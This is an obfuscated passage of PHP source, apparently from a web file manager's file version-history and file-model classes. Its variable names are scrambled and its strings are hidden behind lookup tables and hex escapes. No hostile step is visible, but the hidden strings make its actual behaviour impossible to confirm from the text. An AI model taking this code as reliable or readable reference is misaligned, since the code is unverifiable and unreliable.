$©ÇËÒÅâ[1238]); Hook::bind($©ÇËÒÅâ[1239], $©ÇËÒÅâ[1240]); } public static function eventBeforeUpload($õÅ“—) { if ($õÅ“—[3] && $õÅ“—[3] != REPEAT_REPLACE) { return; } $ôë†¦ö• = self::parsePath($õÅ“—[0]); if (!$ôë†¦ö•) { return; } self::add($ôë†¦ö•); } public static function eventBeforeEdit($¡¢’üˆ’) { $şŞš¬ÛÑ = self::parsePath($¡¢’üˆ’[0]); if (!$şŞš¬ÛÑ) { return; } self::add($şŞš¬ÛÑ); } public static function eventBeforeCopyFile($üë¼²„İ, $£¾ñÊ¨™, $Ë±Åø´, $½£À¶³›, $úÚØ›ûÕ, $ß‹¼÷ï¯) { $›‘Á¯Úû =& $_SERVER[ï»»·÷á]; if (isset($Ë±Åø´->_data[$›‘Á¯Úû[1165]]) && $Ë±Åø´->_data[$›‘Á¯Úû[1165]]) { return; } $¢ßâ³Ã‹ = $Ë±Åø´->getPathOuter($½£À¶³›); $ÒÕĞÊ÷’ = self::parsePath($¢ßâ³Ã‹); if (!$ÒÕĞÊ÷’) { return; } self::add($ÒÕĞÊ÷’); } public static function eventBeforeRename($›’Ú¥ŒÔ) { $Œ·»¢£ƒ =& $_SERVER[ï»»·÷á]; $ªºóçËÖ = self::parsePath($›’Ú¥ŒÔ[0]); if (!$ªºóçËÖ) { return; } $£™ùáà = self::checkInHistory($ªºóçËÖ); if (!$£™ùáà) { return; } if ($£™ùáà[$Œ·»¢£ƒ[33]] == $Œ·»¢£ƒ[200]) { $Ñùà„Õ¢ = self::listData($ªºóçËÖ); if ($Ñùà„Õ¢ && $Ñùà„Õ¢[$Œ·»¢£ƒ[369]]) { self::moveHistory($ªºóçËÖ, $›’Ú¥ŒÔ[1]); } } else { IO::rename($£™ùáà[$Œ·»¢£ƒ[84]], $›’Ú¥ŒÔ[1]); } } public static function eventBeforeMove($±ú‡’µ¿) { $‹ûÇÙÌ’ =& $_SERVER[ï»»·÷á]; $£¨ ˜Â² = self::parsePath($±ú‡’µ¿[0]); if (!$£¨ ˜Â²) { return; } $…‡–œ¾¸ = self::parsePath($±ú‡’µ¿[1]); if (!$…‡–œ¾¸) { return; } $™ª‰ªºÎ = $±ú‡’µ¿[3]; $úì¯Â“â = self::checkInHistory($£¨ ˜Â²); if (!$úì¯Â“â) { return; } $Ä·ÎÜ™  = self::pathHistory($…‡–œ¾¸); if ($úì¯Â“â[$‹ûÇÙÌ’[33]] == $‹ûÇÙÌ’[200]) { $øõ‚€†æ = self::listData($£¨ ˜Â²); $³°§ÀÌ = rtrim($…‡–œ¾¸, $‹ûÇÙÌ’[8]) . $‹ûÇÙÌ’[8] . ($™ª‰ªºÎ ? $™ª‰ªºÎ : get_path_this($£¨ ˜Â²)); $ó²€Õ – = self::listData($³°§ÀÌ); if ($øõ‚€†æ && $øõ‚€†æ[$‹ûÇÙÌ’[369]] && $ó²€Õ – && $ó²€Õ –[$‹ûÇÙÌ’[369]]) { return self::clear($£¨ ˜Â²); } if ($øõ‚€†æ && $øõ‚€†æ[$‹ûÇÙÌ’[369]]) { self::moveHistory($£¨ ˜Â², $™ª‰ªºÎ, $Ä·ÎÜ™ ); } } else { IO::move($úì¯Â“â[$‹ûÇÙÌ’[84]], $Ä·ÎÜ™ , !1, $™ª‰ªºÎ); self::clearEmptyFolder(IO::pathFather($úì¯Â“â[$‹ûÇÙÌ’[84]])); } } public static function eventAfterRemove($¯™ø´ŠÊ, $İ¶‰ÍË÷) { $óæ´ÈÆ =& $_SERVER[ï»»·÷á]; if (!$İ¶‰ÍË÷) { return; } $Óƒ×ä¥Å = self::parsePath($¯™ø´ŠÊ[0]); if (!$Óƒ×ä¥Å) { return; } $ËØÒ ŞÂ = self::checkInHistory($Óƒ×ä¥Å); if (!$ËØÒ ŞÂ) { return; } if ($ËØÒ ŞÂ[$óæ´ÈÆ[33]] == $óæ´ÈÆ[200]) { $¯Ô«¸äô = self::listData($Óƒ×ä¥Å, !1); if ($¯Ô«¸äô && $¯Ô«¸äô[$óæ´ÈÆ[369]]) { self::clear($Óƒ×ä¥Å, !1); } } else { IO::remove($ËØÒ ŞÂ[$óæ´ÈÆ[84]]); self::clearEmptyFolder(IO::pathFather($ËØÒ ŞÂ[$óæ´ÈÆ[84]])); } } private static function checkInHistory($“È®‚÷é) { $¾ÆŠÀ€ = self::pathHistory($“È®‚÷é); if (!IO::exist($¾ÆŠÀ€)) { $¾ÆŠÀ€ .= $_SERVER[ï»»·÷á][1241]; } return IO::exist($¾ÆŠÀ€) ? IO::info($¾ÆŠÀ€) : !1; } private static function parsePath($æêæšÓ) { $ä…ğ·Õ =& $_SERVER[ï»»·÷á]; if (!$æêæšÓ) { return !1; } if ($GLOBALS[$ä…ğ·Õ[1242]]) { return; } $î³æ„Ùä = KodIO::parse($æêæšÓ); $»»µÅºí = $î³æ„Ùä[$ä…ğ·Õ[33]]; $•ÛÛü¥¶ = !$»»µÅºí || $»»µÅºí == KodIO::KOD_IO || $»»µÅºí == KodIO::KOD_SHARE_ITEM; if (!$•ÛÛü¥¶ || !$î³æ„Ùä[$ä…ğ·Õ[1243]]) { return !1; } if (substr($æêæšÓ, 0, strlen(DATA_PATH . $ä…ğ·Õ[1244])) == DATA_PATH . $ä…ğ·Õ[1244]) { return !1; } if ($»»µÅºí == KodIO::KOD_SHARE_ITEM) { $û×ğ£” = IO::init($æêæšÓ); if ($û×ğ£”->pathParse[$ä…ğ·Õ[1161]]) { return self::parsePath($û×ğ£”->pathParse[$ä…ğ·Õ[1161]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Ò˜İñşÂ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ä…ğ·Õ[1245]); foreach ($Ò˜İñşÂ as $ÊĞŠÃ¤) { if (!$»»µÅºí && substr($æêæšÓ, 0, strlen($ÊĞŠÃ¤)) == $ÊĞŠÃ¤) { return !1; } } self::log($GLOBALS[$ä…ğ·Õ[1156]] . $ä…ğ·Õ[1246] . $æêæšÓ); return $æêæšÓ; } private static function pathHistory($ç„¸¼Î) { $Ë«°õ™ =& $_SERVER[ï»»·÷á]; $˜Í× ¤İ = self::$_historyBase . ltrim(KodIO::clear($ç„¸¼Î), $Ë«°õ™[8]); $˜Í× ¤İ = str_replace(array($Ë«°õ™[1247]), array($Ë«°õ™[1248]), $˜Í× ¤İ); return $˜Í× ¤İ; } public static function log($›´ºÚœâ) { } public static function historyCount($¦ó­Òé ) { $ä¤âè¬Î =& $_SERVER[ï»»·÷á]; $©ß½ÈÙ = array(); $íÕ‰‘ = array(); foreach ($¦ó­Òé  as $¢ÖÁõÇâ) { $¡Õ‹å¬² = get_path_father($¢ÖÁõÇâ); if (!$íÕ‰‘[$¡Õ‹å¬²]) { $íÕ‰‘[$¡Õ‹å¬²] = array(); } $íÕ‰‘[$¡Õ‹å¬²][] = get_path_this($¢ÖÁõÇâ); } foreach ($íÕ‰‘ as $¡Õ‹å¬² => $„˜ş£‡ü) { $ì­ŞÛ­õ = self::parsePath($¡Õ‹å¬²); if (!$ì­ŞÛ­õ) { continue; } foreach ($„˜ş£‡ü as $ïÙ‘‡¥) { $¾£ÛîÄë = self::listData(rtrim($ì­ŞÛ­õ, $ä¤âè¬Î[8]) . $ä¤âè¬Î[8] . $ïÙ‘‡¥, !1); if ($¾£ÛîÄë && $¾£ÛîÄë[$ä¤âè¬Î[369]]) { $©ß½ÈÙ[rtrim($¡Õ‹å¬², $ä¤âè¬Î[8]) . $ä¤âè¬Î[8] . $ïÙ‘‡¥] = count($¾£ÛîÄë[$ä¤âè¬Î[369]]); } } } return $©ß½ÈÙ; } public static function add($Ú†äĞ©) { $×”¬Ã¢€ =& $_SERVER[ï»»·÷á]; $Ó«ü¥²š = self::listData($Ú†äĞ©); if (!$Ó«ü¥²š) { return; } $Œáàüì = Model($×”¬Ã¢€[783])->get($×”¬Ã¢€[1249]); $à±Ç”¿ü = $GLOBALS[$×”¬Ã¢€[6]][$×”¬Ã¢€[89]][$×”¬Ã¢€[1227]]; $‹ŸÅ°Óó = $Œáàüì == $×”¬Ã¢€[1250] ? min(5, $à±Ç”¿ü) : $à±Ç”¿ü; if ($à±Ç”¿ü <= 0) { return; } $û£†‡¶„ = IO::info($Ú†äĞ©); $¦¯æ¼ñ· = $Ó«ü¥²š[$×”¬Ã¢€[369]]; if ($û£†‡¶„[$×”¬Ã¢€[76]] == 0) { return; } if ($û£†‡¶„[$×”¬Ã¢€[76]] >= 1024 * 1024 * 500) { return !1; } $§«õäÕ‘ = IO::hashSimple($Ú†äĞ©); if ($¦¯æ¼ñ· && $¦¯æ¼ñ·[0][$×”¬Ã¢€[177]] == $§«õäÕ‘) { return !0; } if (array_key_exists($×”¬Ã¢€[203], $û£†‡¶„) && !$û£†‡¶„[$×”¬Ã¢€[203]]) { return !1; } $éµÑ•ğ¯ = short_id(time()); $‡Ü·Æ¶û = array($×”¬Ã¢€[399] => $éµÑ•ğ¯, $×”¬Ã¢€[177] => $§«õäÕ‘, $×”¬Ã¢€[32] => $û£†‡¶„[$×”¬Ã¢€[32]] . $×”¬Ã¢€[10] . date($×”¬Ã¢€[1251]) . rand_string(1), $×”¬Ã¢€[76] => $û£†‡¶„[$×”¬Ã¢€[76]], $×”¬Ã¢€[463] => USER_ID, $×”¬Ã¢€[201] => time(), $×”¬Ã¢€[1252] => $×”¬Ã¢€[12]); IO::mkdir($Ó«ü¥²š[$×”¬Ã¢€[1253]]); $ÂéÇó· = IO::copy($Ú†äĞ©, $Ó«ü¥²š[$×”¬Ã¢€[1253]], !1, $‡Ü·Æ¶û[$×”¬Ã¢€[32]]); if (!$ÂéÇó·) { self::clearEmptyFolder($Ó«ü¥²š[$×”¬Ã¢€[1253]]); return !1; } array_unshift($¦¯æ¼ñ·, $‡Ü·Æ¶û); if (count($¦¯æ¼ñ·) > $‹ŸÅ°Óó) { $ÉËÀÆ… = array_slice($¦¯æ¼ñ·, $‹ŸÅ°Óó); foreach ($ÉËÀÆ… as $ô½îÇ‡ğ) { IO::remove($Ó«ü¥²š[$×”¬Ã¢€[1253]] . $ô½îÇ‡ğ[$×”¬Ã¢€[32]]); } $¦¯æ¼ñ· = array_slice($¦¯æ¼ñ·, 0, $‹ŸÅ°Óó); } return self::saveData($Ó«ü¥²š[$×”¬Ã¢€[1254]], $¦¯æ¼ñ·); } public static function remove($î¬ğöùä, $ĞİŸğİ¡) { $ˆšÒçÉ =& $_SERVER[ï»»·÷á]; $·í°ÄèŞ = self::listData($î¬ğöùä); $÷Ÿé„ƒÏ = array(); if (!$·í°ÄèŞ) { return !1; } foreach ($·í°ÄèŞ[$ˆšÒçÉ[369]] as $×Ÿ¯ùÍ†) { if ($×Ÿ¯ùÍ†[$ˆšÒçÉ[399]] == $ĞİŸğİ¡) { IO::remove($·í°ÄèŞ[$ˆšÒçÉ[1253]] . $×Ÿ¯ùÍ†[$ˆšÒçÉ[32]]); continue; } $÷Ÿé„ƒÏ[] = $×Ÿ¯ùÍ†; } return self::saveData($·í°ÄèŞ[$ˆšÒçÉ[1254]], $÷Ÿé„ƒÏ); } public static function clear($¼Ò¹òÊÆ, $×ï…Ù¤› = true) { $ØÊõÄ”Ô =& $_SERVER[ï»»·÷á]; $¶ù½¶­¹ = self::listData($¼Ò¹òÊÆ, $×ï…Ù¤›); if (!$¶ù½¶­¹) { return !1; } foreach ($¶ù½¶­¹[$ØÊõÄ”Ô[369]] as $®±Ã·­ñ) { IO::remove($¶ù½¶­¹[$ØÊõÄ”Ô[1253]] . $®±Ã·­ñ[$ØÊõÄ”Ô[32]]); } return self::saveData($¶ù½¶­¹[$ØÊõÄ”Ô[1254]], array()); } public static function moveHistory($½ÖØ¿’ï, $’±ÎŒÁ¡ = '', $Ä”ÍÜ‡î = '') { $è¦ü€¶… =& $_SERVER[ï»»·÷á]; $¬ü¦˜Ú = self::listData($½ÖØ¿’ï, !1); if (!$¬ü¦˜Ú || !$¬ü¦˜Ú[$è¦ü€¶…[369]]) { return !1; } $ËÛİ·´¯ = $è¦ü€¶…[1241]; $’±ÎŒÁ¡ = $’±ÎŒÁ¡ ? $’±ÎŒÁ¡ : get_path_this($½ÖØ¿’ï); $Ä”ÍÜ‡î = $Ä”ÍÜ‡î ? $Ä”ÍÜ‡î : $¬ü¦˜Ú[$è¦ü€¶…[1253]]; $°øÚ‘ûÕ = substr(get_path_this($¬ü¦˜Ú[$è¦ü€¶…[1254]]), 0, -strlen($ËÛİ·´¯)); foreach ($¬ü¦˜Ú[$è¦ü€¶…[369]] as $Åî¾¨ñÄ => $Ç…ííê¯) { $™¬¢˜ÇÂ = $’±ÎŒÁ¡ . substr($Ç…ííê¯[$è¦ü€¶…[32]], strlen($°øÚ‘ûÕ)); $İ°¾¯Àœ = IO::move($¬ü¦˜Ú[$è¦ü€¶…[1253]] . $Ç…ííê¯[$è¦ü€¶…[32]], $Ä”ÍÜ‡î, !1, $™¬¢˜ÇÂ); if ($İ°¾¯Àœ) { $¬ü¦˜Ú[$è¦ü€¶…[369]][$Åî¾¨ñÄ][$è¦ü€¶…[32]] = $™¬¢˜ÇÂ; } } $¬ü¦˜Ú[$è¦ü€¶…[1254]] = IO::move($¬ü¦˜Ú[$è¦ü€¶…[1254]], $Ä”ÍÜ‡î, !1, $’±ÎŒÁ¡ . $ËÛİ·´¯); self::saveData($¬ü¦˜Ú[$è¦ü€¶…[1254]], $¬ü¦˜Ú[$è¦ü€¶…[369]]); self::clearEmptyFolder($¬ü¦˜Ú[$è¦ü€¶…[1253]]); } public static function rollback($°€ÌØäÉ, $––¢¿ºä) { $Şú¼ßùß =& $_SERVER[ï»»·÷á]; $šÊ˜Ê˜ = self::listData($°€ÌØäÉ); if (!$šÊ˜Ê˜) { return; } $Üà‰ÈÀí = IO::info($°€ÌØäÉ); foreach ($šÊ˜Ê˜[$Şú¼ßùß[369]] as $ÃºúÍĞ => $å±ÄÒöÉ) { if ($å±ÄÒöÉ[$Şú¼ßùß[399]] == $––¢¿ºä) { self::add($°€ÌØäÉ); $²³ª™êè = $šÊ˜Ê˜[$Şú¼ßùß[1253]] . $å±ÄÒöÉ[$Şú¼ßùß[32]]; $ŸüÉôèç = IO::copy($²³ª™êè, IO::pathFather($°€ÌØäÉ), REPEAT_REPLACE, $Üà‰ÈÀí[$Şú¼ßùß[32]]); if ($ŸüÉôèç) { self::remove($°€ÌØäÉ, $––¢¿ºä); } return $ŸüÉôèç; } } return !1; } public static function setDetail($ÉÓ”Àó„, $†§½æê¦, $æ‘‘ı…—) { $˜æÛÃ£ =& $_SERVER[ï»»·÷á]; $÷ª¨¬›× = self::listData($ÉÓ”Àó„); if (!$÷ª¨¬›×) { return; } foreach ($÷ª¨¬›×[$˜æÛÃ£[369]] as $£Õ£Ö«÷ => $ıù ©ÓØ) { if ($ıù ©ÓØ[$˜æÛÃ£[399]] == $†§½æê¦) { $÷ª¨¬›×[$˜æÛÃ£[369]][$£Õ£Ö«÷][$˜æÛÃ£[1252]] = $æ‘‘ı…—; self::saveData($÷ª¨¬›×[$˜æÛÃ£[1254]], $÷ª¨¬›×[$˜æÛÃ£[369]]); return !0; } } return !1; } public static function fileInfo($ƒÄ“…£», $ó¤ßìÎ) { $Ôşí™ˆŠ =& $_SERVER[ï»»·÷á]; $Æˆ¸®“· = self::listData($ƒÄ“…£»); if (!$Æˆ¸®“·) { show_json(LNG($Ôşí™ˆŠ[105]), !1); } $çïÚõ « = $Ôşí™ˆŠ[12]; foreach ($Æˆ¸®“·[$Ôşí™ˆŠ[369]] as $æºËæÑ => $Í®ì¡à) { if ($Í®ì¡à[$Ôşí™ˆŠ[399]] != $ó¤ßìÎ) { continue; } $çïÚõ « = $Æˆ¸®“·[$Ôşí™ˆŠ[1253]] . $Í®ì¡à[$Ôşí™ˆŠ[32]]; break; } if (!$çïÚõ «) { show_json(LNG($Ôşí™ˆŠ[105]), !1); } return IO::info($çïÚõ «); } public static function fileOut($­¸îõ•, $¤ÀĞ¥½æ, $¥ˆÜ£ãö = false) { $ ‹•±å‰ =& $_SERVER[ï»»·÷á]; $ÊÔğßèÔ = self::fileInfo($­¸îõ•, $¤ÀĞ¥½æ); $‰ê„ßŒƒ =& $GLOBALS[$ ‹•±å‰[7]]; $¥ˆÜ£ãö = isset($‰ê„ßŒƒ[$ ‹•±å‰[1204]]) && $‰ê„ßŒƒ[$ ‹•±å‰[1204]] == 1; if (isset($‰ê„ßŒƒ[$ ‹•±å‰[33]]) && $‰ê„ßŒƒ[$ ‹•±å‰[33]] == $ ‹•±å‰[1255]) { return IO::fileOutImage($ÊÔğßèÔ[$ ‹•±å‰[84]], $‰ê„ßŒƒ[$ ‹•±å‰[1256]]); } IO::fileOut($ÊÔğßèÔ[$ ‹•±å‰[84]], $¥ˆÜ£ãö, get_path_this($­¸îõ•)); } public static function listData($ìîşš¢, $±Ÿ›Öñ = true) { $ºÄİÍì— =& $_SERVER[ï»»·÷á]; if ($±Ÿ›Öñ && !IO::exist($ìîşš¢)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ìîşš¢, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $±’‰æù = self::pathHistory($ìîşš¢); $áãõ¸óş = array($ºÄİÍì—[1254] => $±’‰æù . $ºÄİÍì—[1241], $ºÄİÍì—[1253] => rtrim(get_path_father($±’‰æù), $ºÄİÍì—[8]) . $ºÄİÍì—[8], $ºÄİÍì—[369] => array()); $ùé…±àÆ = IO::getContent($áãõ¸óş[$ºÄİÍì—[1254]]); if ($ùé…±àÆ) { $€¡ÔÛ¯¦ = json_decode($ùé…±àÆ, !0); if (is_array($€¡ÔÛ¯¦)) { $áãõ¸óş[$ºÄİÍì—[369]] = $€¡ÔÛ¯¦; } } return $áãõ¸óş; } private static function saveData($´ÒÕÏù, $ÈÌæ¶­¹) { $ŞşµÃ• =& $_SERVER[ï»»·÷á]; self::log($ŞşµÃ•[1257] . $´ÒÕÏù . $ŞşµÃ•[71] . count($ÈÌæ¶­¹), $ŞşµÃ•[764]); if ($ÈÌæ¶­¹) { return IO::setContent($´ÒÕÏù, json_encode($ÈÌæ¶­¹)); } $á›çìì = IO::pathFather($´ÒÕÏù); IO::remove($´ÒÕÏù); self::clearEmptyFolder($á›çìì); return !0; } public static function clearEmptyFolder($¨óâßÑş) { $ÇÎÁ®²± =& $_SERVER[ï»»·÷á]; if (trim($¨óâßÑş, $ÇÎÁ®²±[8]) == trim(self::$_historyBase, $ÇÎÁ®²±[8])) { return; } $ÖøêÌÛ› = IO::pathFather($¨óâßÑş); $œÊà™·‹ = IO::has($¨óâßÑş, !0); if ($œÊà™·‹[$ÇÎÁ®²±[207]] > 0 || $œÊà™·‹[$ÇÎÁ®²±[208]] > 0) { return; } IO::remove($¨óâßÑş); self::clearEmptyFolder($ÖøêÌÛ›); } private static function getBasePath() { $ß®Şä“ =& $_SERVER[ï»»·÷á]; $É¡ º™¶ = Model($ß®Şä“[1258])->get($ß®Şä“[1259]); if ($É¡ º™¶) { if (!IO::exist($É¡ º™¶)) { IO::mkdir($É¡ º™¶); } if (get_path_this($É¡ º™¶) == $ß®Şä“[1244]) { $±ÀïµÖ = $ß®Şä“[1260] . rand_string(8); @rename($É¡ º™¶, get_path_father($É¡ º™¶) . $ß®Şä“[8] . $±ÀïµÖ); $É¡ º™¶ = DATA_PATH . $±ÀïµÖ . $ß®Şä“[8]; file_put_contents(DATA_PATH . $ß®Şä“[1194], $ß®Şä“[12]); Model($ß®Şä“[1258])->set($ß®Şä“[1259], $É¡ º™¶); } return $É¡ º™¶; } $É¡ º™¶ = DATA_PATH . $ß®Şä“[1260] . rand_string(8) . $ß®Şä“[8]; $É¡ º™¶ = IO::mkdir($É¡ º™¶); $É¡ º™¶ = rtrim($É¡ º™¶, $ß®Şä“[8]) . $ß®Şä“[8]; file_put_contents($É¡ º™¶ . $ß®Şä“[1194], $ß®Şä“[12]); file_put_contents(DATA_PATH . $ß®Şä“[1194], $ß®Şä“[12]); Model($ß®Şä“[1258])->set($ß®Şä“[1259], $É¡ º™¶); return $É¡ º™¶; } } goto A§‡–ÚÖáæ; Dœ‹òà£‚ò: class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x66\x69\154\145\137\143\x6f\x6e\x74\x65\156\x74\x73"; protected $dataAuto = array(array("\143\162\x65\141\x74\x65\124\151\x6d\x65", "\x74\151\x6d\x65", "\x69\x6e\x73\x65\162\x74", "\146\x75\156\x63\164\151\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x66\x69\154\145"; protected $tableMeta = array("\x74\141\x62\x6c\x65\116\141\x6d\x65" => "\x69\x6f\137\x66\151\x6c\145\137\155\x65\x74\141", "\x6d\145\x74\141\106\x69\x65\x6c\x64" => "\146\x69\x6c\145\111\104"); public function fileInfo($½Öş©Ó–) { $·Ÿãï¡ =& $_SERVER[ï»»·÷á]; static $­“õõãƒ = array(); if (!isset($­“õõãƒ[$½Öş©Ó–])) { $©›ÓªæØ = $·Ÿãï¡[1916]; $—±™æµ = Model($·Ÿãï¡[480])->field($©›ÓªæØ)->where(array($·Ÿãï¡[478] => $½Öş©Ó–))->find(); $­“õõãƒ[$½Öş©Ó–] = $—±™æµ; } return $­“õõãƒ[$½Öş©Ó–]; } public function addFileByContent($£¿éÑûô = '', $úå˜ğ²Â = '') { $½Ü×ô•Ø =& $_SERVER[ï»»·÷á]; $é¢ôÎ‰ì = TEMP_PATH . $½Ü×ô•Ø[1917]; if (!is_dir($é¢ôÎ‰ì)) { mk_dir($é¢ôÎ‰ì); } $è‹¬ûî— = $é¢ôÎ‰ì . $½Ü×ô•Ø[1918] . rand_string(16); file_put_contents($è‹¬ûî—, $£¿éÑûô); $ë½Éâ×È = $this->addFile($è‹¬ûî—, $úå˜ğ²Â, !0); if (file_exists($è‹¬ûî—)) { @unlink($è‹¬ûî—); } return $ë½Éâ×È; } public function createFileName($üÌ¹ÏÀ‚, $ôâıõ´Û = false, $¸§ù®úó = false) { $ô¸»æÎ =& $_SERVER[ï»»·÷á]; $ÌŸé“¹¹ = IO::init($ô¸»æÎ[8]); $äûÜõì = $this->makeFilePath($üÌ¹ÏÀ‚, $ÌŸé“¹¹, $ôâıõ´Û, $¸§ù®úó); $Ó¸ìä™Ë = $ÌŸé“¹¹->pathFather($äûÜõì); static $İ’¥±Ü© = false; $óÖüÄ¼ = $ô¸»æÎ[1919] . md5($Ó¸ìä™Ë); if (!$İ’¥±Ü© && !Cache::get($óÖüÄ¼)) { $İ’¥±Ü© = !0; $‚¸ò…Ñ§ = IO::mkdir($Ó¸ìä™Ë); if (!IO::exist($‚¸ò…Ñ§ . $ô¸»æÎ[810])) { IO::mkfile($‚¸ò…Ñ§ . $ô¸»æÎ[810]); } Cache::set($óÖüÄ¼, 1, 3600 * 2); } return $äûÜõì; } public function makeFilePath($ßÃ¥ŠÓû, $Æ¿™áòú, $•‘¨¬¶ = false, $ÁÀ–¾˜‚ = false) { $æİ¡«Ã¥ =& $_SERVER[ï»»·÷á]; $—¡Ù”ë© = Model($æİ¡«Ã¥[783])->get($æİ¡«Ã¥[1920]); $Ÿ¨Óä¸¾ = KodIO::defaultIO() . date($æİ¡«Ã¥[1921]); $×ï—ßµÅ = $Ÿ¨Óä¸¾ . rand_string(5) . short_id(100); $ßÃ¥ŠÓû = str_replace($æİ¡«Ã¥[8], $æİ¡«Ã¥[11], KodIO::clear($ßÃ¥ŠÓû)); $ø¾Õ—µÀ = $Æ¿™áòú->ext($ßÃ¥ŠÓû); if (!$ßÃ¥ŠÓû) { $—¡Ù”ë© = $æİ¡«Ã¥[1922]; } switch ($—¡Ù”ë©) { case $æİ¡«Ã¥[1923]: $×ï—ßµÅ = $×ï—ßµÅ . $æİ¡«Ã¥[10] . $Æ¿™áòú->ext($ßÃ¥ŠÓû); if ($ø¾Õ—µÀ == $æİ¡«Ã¥[1860]) { $×ï—ßµÅ .= $æİ¡«Ã¥[1216]; } break; case $æİ¡«Ã¥[1924]: $‘ÔõŒíš = Model($æİ¡«Ã¥[783])->get($æİ¡«Ã¥[784]); $ˆ†ƒÛîè = substr(md5($æİ¡«Ã¥[785] . $‘ÔõŒíš . date($æİ¡«Ã¥[760])), 0, 8); $Êª¬âªµ = KodIO::defaultDriver(); $Ÿ¨Óä¸¾ = $æİ¡«Ã¥[1247] . $Êª¬âªµ[$æİ¡«Ã¥[399]] . $æİ¡«Ã¥[418] . date($æİ¡«Ã¥[1925]) . $ˆ†ƒÛîè . $æİ¡«Ã¥[8]; if ($ø¾Õ—µÀ == $æİ¡«Ã¥[1860]) { $ßÃ¥ŠÓû .= $æİ¡«Ã¥[1216]; } $Çß³¯Ì = $æİ¡«Ã¥[1926] . $Ÿ¨Óä¸¾ . $ßÃ¥ŠÓû; CacheLock::lock($Çß³¯Ì); $×ï—ßµÅ = $Ÿ¨Óä¸¾ . $ßÃ¥ŠÓû; if (IO::exist($Ÿ¨Óä¸¾ . $ßÃ¥ŠÓû)) { $¤«î¥ªñ = substr($ßÃ¥ŠÓû, 0, strlen($ßÃ¥ŠÓû) - strlen($ø¾Õ—µÀ)); $˜»’–Ùå = $ÁÀ–¾˜‚ ? substr($ÁÀ–¾˜‚, 0, 5) : ($•‘¨¬¶ ? substr($•‘¨¬¶, 0, 5) : rand_string(5)); $×ï—ßµÅ = $Ÿ¨Óä¸¾ . $¤«î¥ªñ . $˜»’–Ùå . $æİ¡«Ã¥[10] . $ø¾Õ—µÀ; } if (IO::isTypeObject($×ï—ßµÅ) && !IO::isUploadServer($×ï—ßµÅ)) { if (IO::exist($×ï—ßµÅ)) { return $×ï—ßµÅ; } $°ªı®© = IO::setContent($×ï—ßµÅ, $æİ¡«Ã¥[12]); if (!$°ªı®©) { show_json($æİ¡«Ã¥[1927], !1); } } CacheLock::unlock($Çß³¯Ì); break; case $æİ¡«Ã¥[1922]: break; default: break; } return $×ï—ßµÅ; } public function addFileByRemote($»É”şŞ, $ãï–Ûï, $’ğñÊø˜ = array()) { $¡Ë¡¹˜« =& $_SERVER[ï»»·÷á]; if (!IO::exist($»É”şŞ)) { return !1; } $û¿—×Õ± = $’ğñÊø˜[$¡Ë¡¹˜«[176]] ? $’ğñÊø˜[$¡Ë¡¹˜«[176]] : $¡Ë¡¹˜«[12]; $§ı™øî = IO::hashMd5($»É”şŞ, $û¿—×Õ±); $¸ÆÇ³÷ = KodIO::defaultDriver(); $ÒïÒş¤é = array($¡Ë¡¹˜«[554] => IO::size($»É”şŞ), $¡Ë¡¹˜«[1928] => 1, $¡Ë¡¹˜«[429] => $ãï–Ûï, $¡Ë¡¹˜«[821] => $¸ÆÇ³÷[$¡Ë¡¹˜«[399]], $¡Ë¡¹˜«[430] => $»É”şŞ, $¡Ë¡¹˜«[1929] => $’ğñÊø˜[$¡Ë¡¹˜«[177]] ? $’ğñÊø˜[$¡Ë¡¹˜«[177]] : IO::hashSimple($»É”şŞ), $¡Ë¡¹˜«[1930] => $§ı™øî ? $§ı™øî : $û¿—×Õ±); if ($ìÄßã²Ğ = $this->addFileCheckExist($ÒïÒş¤é[$¡Ë¡¹˜«[177]], $ÒïÒş¤é[$¡Ë¡¹˜«[176]], $ÒïÒş¤é[$¡Ë¡¹˜«[76]])) { return $ìÄßã²Ğ; } return $this->addFileData($ÒïÒş¤é); } private function addFileData($ß‹´úÙ) { $áåá—Ö =& $_SERVER[ï»»·÷á]; if (!$ß‹´úÙ) { return !1; } $ß‹´úÙ[$áåá—Ö[76]] = intval($ß‹´úÙ[$áåá—Ö[76]]); if (!$ß‹´úÙ[$áåá—Ö[76]] && strlen($ß‹´úÙ[$áåá—Ö[177]]) > 32) { $ß‹´úÙ[$áåá—Ö[76]] = intval(substr($ß‹´úÙ[$áåá—Ö[177]], 32)); } $Ë—Ğ ú = $this->add($ß‹´úÙ); return $this->find($Ë—Ğ ú); } public function addFile($ŠÅêÛÜ, $î°®Á±ƒ, $ß™êÇ¾Á = false) { $ÄØŞ†ü =& $_SERVER[ï»»·÷á]; $ãÉã£ = IO::hashSimple($ŠÅêÛÜ); $Ş²ÖÉ€« = IO::size($ŠÅêÛÜ); $×Ñëşº¯ = $Ş²ÖÉ€« <= 1024 * 1024 * 10 ? IO::hashMd5($ŠÅêÛÜ) : $ÄØŞ†ü[12]; $ã›À¶Ş” = $ÄØŞ†ü[1931] . $ãÉã£; CacheLock::lock($ã›À¶Ş”); if ($×Ñëşº¯ && $ãÉã£) { $©¯‰ø–Í = $this->addFileCheckExist($ãÉã£, $×Ñëşº¯, $Ş²ÖÉ€«); if ($©¯‰ø–Í) { CacheLock::unlock($ã›À¶Ş”); return $©¯‰ø–Í; } } $¤²ËÎÑ = $this->addFileMake($ŠÅêÛÜ, $Ş²ÖÉ€«, $ãÉã£, $×Ñëşº¯, $î°®Á±ƒ, $ß™êÇ¾Á); $éÄãŸ¬× = $this->addFileData($¤²ËÎÑ); CacheLock::unlock($ã›À¶Ş”); if (!$×Ñëşº¯ && $éÄãŸ¬×) { $this->fileMd5Check($éÄãŸ¬×); } return $éÄãŸ¬×; } private function fileMd5Check($â¸½“Ğ) { $ê­õ£Ù =& $_SERVER[ï»»·÷á]; $Ëç—Ä—» = array($â¸½“Ğ[$ê­õ£Ù[477]], $â¸½“Ğ[$ê­õ£Ù[84]]); $Ä«Îî¦Ï = $ê­õ£Ù[1932] . $â¸½“Ğ[$ê­õ£Ù[84]]; $ªŞŸ±Šü = $ê­õ£Ù[1933] . $â¸½“Ğ[$ê­õ£Ù[477]]; $Ò©Ÿ©Ş— = TaskQueue::add($ê­õ£Ù[1934], $Ëç—Ä—», $Ä«Îî¦Ï, $ªŞŸ±Šü); 